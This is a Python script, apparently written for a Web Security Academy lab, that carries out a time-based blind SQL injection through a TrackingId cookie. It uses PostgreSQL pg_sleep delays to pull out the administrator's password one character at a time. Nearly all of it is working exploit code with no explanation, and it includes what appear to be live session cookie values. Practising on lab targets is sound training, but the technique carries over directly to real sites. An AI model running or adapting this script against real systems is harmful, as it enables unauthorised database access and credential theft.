import requests
import time

# Target URL
url = "https://0a9100e4041a16af80f499aa003e0043.web-security-academy.net/filter"

# Characters to test
characters = 'abcdefghijklmnopqrstuvwxyz0123456789'

# Known password length
password_length = 20

# TrackingId and session cookies
cookies = {
    'TrackingId': "jZLqt000quad9v0T",  # Placeholder, will be modified for each request
    'session': "lYB35Aggj5bmnHVgrkzCh46SfygxPi7t"
}

# Function to test each character of the password
def test_password():
    password = ""

    for position in range(1, password_length + 1):
        for char in characters:
            # Modify the payload for SQL injection
            payload = f"jZLqt000quad9v0T'%3B+SELECT+CASE+WHEN+(username='administrator'+AND+SUBSTRING(password,{position},1)='{char}')+THEN+pg_sleep(10)+ELSE+pg_sleep(0)+END+FROM users--"
            cookies['TrackingId'] = payload

            # Send the request and measure the response time
            start_time = time.time()
            response = requests.get(url, params={'category': 'Pets'}, cookies=cookies)
            response_time = time.time() - start_time

            # If response time is more than 10 seconds, we found the correct character
            if response_time > 10:
                print(f"Found character at position {position}: {char}")
                password += char
                break
    
    return password

# Start password extraction
if __name__ == "__main__":
    extracted_password = test_password()
    print(f"Extracted password: {extracted_password}")
